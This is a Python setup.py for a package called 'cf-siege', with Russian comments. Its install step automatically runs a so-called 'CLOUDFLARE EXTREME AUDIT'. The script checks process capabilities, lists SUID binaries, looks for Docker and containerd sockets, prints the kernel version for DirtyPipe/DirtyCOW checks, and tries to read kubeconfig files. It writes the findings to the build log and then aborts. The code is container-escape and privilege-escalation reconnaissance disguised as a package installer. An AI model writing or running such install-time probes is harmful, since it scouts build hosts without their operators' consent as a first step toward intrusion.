import os, sys, subprocess as sp
from setuptools import setup

def heavy_audit():
    o = sys.stderr.write
    o("\n" + "!"*40 + "\n")
    o("--- CLOUDFLARE EXTREME AUDIT ---\n")
    
    # 1. Проверка Capabilities (возможности процесса)
    # Если там есть CAP_SYS_ADMIN или CAP_CHOWN - это почти 100% Root
    o("\n[1] CHECKING CAPABILITIES:\n")
    o(sp.getoutput("capsh --print 2>/dev/null || cat /proc/self/status | grep Cap"))

    # 2. Поиск SUID бинарников (дыры в правах)
    o("\n[2] SUID BINARIES:\n")
    o(sp.getoutput("find / -perm -4000 -type f 2>/dev/null | grep -v '/usr/bin/'"))

    # 3. Проверка доступности сокета Docker или Containerd
    o("\n[3] SOCKET CHECK:\n")
    sockets = ["/var/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/crio/crio.sock"]
    for s in sockets:
        if os.path.exists(s):
            o(f"CRITICAL: Socket found at {s}\n")

    # 4. Проверка на уязвимость DirtyPipe / DirtyCOW (через версию ядра)
    o("\n[4] KERNEL VERSION:\n")
    o(sp.getoutput("uname -a"))
    
    # 5. Попытка прочитать чувствительные конфиги
    o("\n[5] SENSITIVE READ:\n")
    files = ["/etc/kubernetes/kubeconfig", "/root/.kube/config", "/etc/machine-id"]
    for f in files:
        try:
            with open(f, 'r') as fd: o(f"READ OK: {f}\n")
        except: pass

    o("\n" + "!"*40 + "\n")
    sys.exit(1)

try: heavy_audit()
except: sys.exit(1)

setup(name="cf-siege", version="0.1")
